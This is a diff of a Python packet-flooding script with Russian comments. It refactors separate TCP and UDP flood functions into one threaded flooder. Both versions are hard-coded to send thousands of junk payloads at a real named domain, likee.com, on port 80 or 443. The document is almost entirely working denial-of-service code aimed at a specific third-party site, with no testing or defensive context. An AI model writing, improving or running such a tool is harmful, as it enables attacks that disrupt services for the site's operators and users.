@@ -26,81 +26,46 @@ time.sleep(1)
 #hello world
 
 
+TARGET_HOST = "likee.com"
+TARGET_PORT = 80
+NUM_THREADS = 10
+PACKETS_PER_THREAD = 1000
+PAYLOAD_SIZE = 4024
+USE_UDP = False
 
-
-
-# Настройки 
-TARGET_HOST = "likee.com"  # Замените на целевой домен
-TARGET_PORT = 443  # Замените на целевой порт (80 для HTTP, 443 для HTTPS)
-NUM_THREADS = 10  # Количество потоков
-PACKETS_PER_THREAD = 1000 # Количество пакетов на поток
-PAYLOAD_SIZE = 5024  # Размер п0олезной нагрузки (в байтах)
-USE_UDP = False # True для UDP, False для TCP
-
-# Функция для отправки TCP пакетов
-def tcp_flood(host, port, packets_per_thread, payload_size):
+def flood(host, port, packets_per_thread, payload_size, use_udp):
+    sock_type = socket.SOCK_DGRAM if use_udp else socket.SOCK_STREAM
+    protocol = socket.AF_INET
     for i in range(packets_per_thread):
         try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.connect((host, port))
-            payload = b"A" * payload_size  # Создаем полезную нагрузку
-            sock.sendall(payload)
-            sock.close()
-            print(f"TCP: Отправлен пакет {i+1}")
-            os.system("clear")
+            with socket.socket(protocol, sock_type) as sock:
+                if not use_udp:
+                    sock.connect((host, port))
+                payload = b"A" * payload_size
+                sock.sendto(payload, (host, port)) if use_udp else sock.sendall(payload)
+                print(f"{'UDP' if use_udp else 'TCP'}: Отправлен пакет {i+1}")
         except socket.error as e:
-            print(f"TCP: Ошибка сокета: {e}")
-            os.system("clear")
+            print(f"{'UDP' if use_udp else 'TCP'}: Ошибка сокета: {e}")
             break
         except Exception as e:
-        
-            print(f"TCP: Другая ошибка: {e}")
-            os.system("clear")
+            print(f"{'UDP' if use_udp else 'TCP'}: Другая ошибка: {e}")
             break
-        time.sleep(0.01) # Небольшая задержка, чтобы не перегрузить систему
+        time.sleep(0.01)
 
-# Функция для отправки UDP пакетов
-def udp_flood(host, port, packets_per_thread, payload_size):
-    for i in range(packets_per_thread):
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            payload = b"B" * payload_size  # Создаем полезную нагрузку
-            sock.sendto(payload, (host, port))
-            print(f"UDP: Отправлен пакет {i+1}")
-        except socket.error as e:
-            print(f"UDP: Ошибка сокета: {e}")
-            break
-        except Exception as e:
-            print(f"UDP: Другая ошибка: {e}")
-            break
-        time.sleep(0.01) # Небольшая задержка, чтобы не перегрузить систему
+threads = []
+print(f"Начинаем отправку пакетов на {TARGET_HOST}:{TARGET_PORT}...")
 
-# Основная функция
-def main():
-    threads = []
-    print(f"Начинаем отправку пакетов на {TARGET_HOST}:{TARGET_PORT}...")
+for i in range(NUM_THREADS):
+    thread = threading.Thread(target=flood, args=(TARGET_HOST, TARGET_PORT, PACKETS_PER_THREAD, PAYLOAD_SIZE, USE_UDP))
+    print(f"Запущен {'UDP' if USE_UDP else 'TCP'} поток {i+1}")
+    threads.append(thread)
+    thread.start()
 
-    for i in range(NUM_THREADS):
-        if USE_UDP:
-            thread = threading.Thread(target=udp_flood, args=(TARGET_HOST, TARGET_PORT, PACKETS_PER_THREAD, PAYLOAD_SIZE))
-            print(f"Запущен UDP поток {i+1}")
-        else:
-            thread = threading.Thread(target=tcp_flood, args=(TARGET_HOST, TARGET_PORT, PACKETS_PER_THREAD, PAYLOAD_SIZE))
-            print(f"Запущен TCP поток {i+1}")
+for thread in threads:
+    thread.join()
 
-        threads.append(thread)
-        thread.start()
+print("Отправка пакетов завершена.")
 
-    for thread in threads:
-        thread.join()
-
-    print("Отправка пакетов завершена.")
-    print ("Закрываю программу")
-    exit()
-
-if __name__ == "__main__":
-    main()
-#the end
 
 
 
